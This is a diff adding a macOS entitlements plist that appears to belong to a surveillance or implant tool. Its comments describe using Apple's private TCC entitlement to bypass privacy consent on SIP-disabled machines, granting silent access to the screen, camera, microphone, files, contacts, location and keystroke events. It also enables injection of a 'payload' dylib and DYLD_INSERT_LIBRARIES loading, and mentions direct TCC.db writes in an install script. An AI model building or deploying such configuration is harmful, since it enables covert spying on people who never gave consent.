@@ -1,0 +1,49 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <!--
+    com.apple.private.tcc.allow
+    ─────────────────────────────────────────────────────────────────────────
+    Private TCC bypass entitlement used by Apple's system daemons.
+    tccd honours this from any binary when SIP is disabled (CSR_ALLOW_AMFI is
+    clear), meaning the process gets implicit TCC approval for every listed
+    service without db rows, dialogs, or provisioning scripts.
+
+    Applied with ad-hoc signing (-) at build time (build.sh) and again at the
+    installed path during install.sh.  The TCC.db writes in install.sh remain
+    as a fallback for the edge case where codesign failed.
+  -->
+  <key>com.apple.private.tcc.allow</key>
+  <array>
+    <string>kTCCServiceAccessibility</string>
+    <string>kTCCServiceScreenCapture</string>
+    <string>kTCCServiceSystemPolicyAllFiles</string>
+    <string>kTCCServiceCamera</string>
+    <string>kTCCServiceMicrophone</string>
+    <string>kTCCServiceAddressBook</string>
+    <string>kTCCServiceCalendar</string>
+    <string>kTCCServicePhotos</string>
+    <string>kTCCServiceListenEvent</string>
+    <string>kTCCServicePostEvent</string>
+    <string>kTCCServiceAppleEvents</string>
+    <string>kTCCServiceSystemPolicyDesktopFolder</string>
+    <string>kTCCServiceSystemPolicyDocumentsFolder</string>
+    <string>kTCCServiceSystemPolicyDownloadsFolder</string>
+    <string>kTCCServiceDeveloperTool</string>
+    <string>kTCCServiceReminders</string>
+    <string>kTCCServiceLocation</string>
+    <string>kTCCServiceBluetoothAlways</string>
+    <string>kTCCServiceUserTracking</string>
+  </array>
+
+  <!-- Allow injected dylibs (payload/screenshot.dylib) without validation -->
+  <key>com.apple.security.cs.disable-library-validation</key>
+  <true/>
+
+  <!-- Allow DYLD_INSERT_LIBRARIES for dylib-env injection path -->
+  <key>com.apple.security.cs.allow-dyld-environment-variables</key>
+  <true/>
+</dict>
+</plist>
